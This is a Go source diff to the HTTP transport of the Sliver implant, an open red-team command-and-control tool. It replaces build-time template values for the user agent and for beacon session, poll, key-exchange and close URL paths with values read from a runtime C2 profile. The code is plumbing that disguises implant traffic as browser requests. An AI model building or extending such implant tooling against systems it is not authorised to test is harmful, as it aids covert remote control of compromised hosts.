@@ -45,12 +45,13 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
 	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 const (
-	userAgent         = "{{GenerateUserAgent}}"
+	// userAgent         = "GenerateUserAgent"
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
 )
@@ -75,7 +76,8 @@ func HTTPStartSession(address string, pathPrefix string, timeout time.Duration, 
 	return client, nil
 }
 
-// SliverHTTPClient - Helper struct to keep everything together
+// SliverHTTPClient - Helper struct to keep everything together.
+// This client implements the Beacon interface, in beacon.go
 type SliverHTTPClient struct {
 	Origin     string
 	PathPrefix string
@@ -83,6 +85,10 @@ type SliverHTTPClient struct {
 	ProxyURL   string
 	SessionKey *cryptography.AESKey
 	SessionID  string
+
+	// Operating parameters
+	uri     *url.URL
+	profile *sliverpb.C2ProfileHTTP // We can use on-demand HTTP profiles
 }
 
 // SessionInit - Initialize the session
@@ -114,7 +120,7 @@ func (s *SliverHTTPClient) SessionInit() error {
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
-	req.Header.Set("User-Agent", userAgent)
+	req.Header.Set("User-Agent", s.profile.UserAgent)
 	if method == http.MethodGet {
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 		req.Header.Set("Accept", acceptHeaderValue)
@@ -358,77 +364,85 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 
 func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.KeyExchangePaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.KeyExchangeFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.KeyExchangeFileExt}}"))
+	segments := s.profile.KeyExchangePaths
+	filenames := s.profile.KeyExchangeFiles
+	// segments := []string{
+	//         // {{range .HTTPC2ImplantConfig.KeyExchangePaths}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	// filenames := []string{
+	//         // {{range .HTTPC2ImplantConfig.KeyExchangeFiles}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.KeyExchangeFileExt))
 	return curl
 }
 
 func (s *SliverHTTPClient) pollURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.PollPaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.PollFiles}}
-		"{{.}}",
-		// {{end}}
-	}
+	segments := s.profile.PollPaths
+	filenames := s.profile.PollFiles
+	// segments := []string{
+	//         // {{range .HTTPC2ImplantConfig.PollPaths}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	// filenames := []string{
+	//         // {{range .HTTPC2ImplantConfig.PollFiles}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
 
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.PollFileExt}}"))
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.PollFileExt))
 	return curl
 }
 
 func (s *SliverHTTPClient) startSessionURL() *url.URL {
 	sessionURI := s.sessionURL()
-	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExt }}")
-	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExt }}"
+	uri := strings.TrimSuffix(sessionURI.String(), s.profile.SessionFileExt)
+	uri += s.profile.StartSessionFileExt
 	curl, _ := url.Parse(uri)
 	return curl
 }
 
 func (s *SliverHTTPClient) sessionURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.SessionPaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.SessionFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.SessionFileExt}}"))
+	segments := s.profile.SessionPaths
+	filenames := s.profile.SessionFiles
+	// segments := []string{
+	//         // {{range .HTTPC2ImplantConfig.SessionPaths}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	// filenames := []string{
+	//         // {{range .HTTPC2ImplantConfig.SessionFiles}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.SessionFileExt))
 	return curl
 }
 
 func (s *SliverHTTPClient) closeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.ClosePaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.CloseFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.CloseFileExt}}"))
+	segments := s.profile.ClosePaths
+	filenames := s.profile.CloseFiles
+	// segments := []string{
+	//         // {{range .HTTPC2ImplantConfig.ClosePaths}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	// filenames := []string{
+	//         // {{range .HTTPC2ImplantConfig.CloseFiles}}
+	//         "{{.}}",
+	//         // {{end}}
+	// }
+	//
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, s.profile.CloseFileExt))
 	return curl
 }
 
